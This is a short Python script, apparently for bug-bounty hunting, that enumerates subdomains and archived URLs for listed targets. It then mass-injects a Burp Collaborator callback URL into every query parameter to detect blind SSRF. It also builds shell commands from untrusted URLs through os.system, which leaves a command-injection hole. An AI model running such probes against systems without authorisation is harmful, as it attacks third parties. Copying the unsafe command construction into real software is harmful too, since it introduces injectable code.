import os
import random
import string
import time

def get_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str
    # print("Random string of length", length, "is:", result_str)

input_file = "lamscun_bbp_scopes.txt"
burp_collab = "mtjqhuwtoaamqbeevujc4coag1msaky9.oastify.com"

print("Finding waybackurls for targets...")
os.system('cat {} | subfinder -all -silent | httpx -silent -threads 1000 | gau --o out.txt'.format(input_file))
print("    => done")

with open('out.txt') as f:
    lines = [line.replace("\n", "") for line in f]

 
if len(lines) > 0:
	print("Finding ssrf...")
	for target in lines:
		random_str = get_random_string(7)
		log = "{} - {}".format(random_str, target)
		print(log)
		os.system('echo "{}" >> log.txt'.format(log))
		os.system('echo "{}" | grep "=" | qsreplace http://lsscope-{}.{} | httpx -silent'.format(target, random_str, burp_collab))
	print("    => done")
		
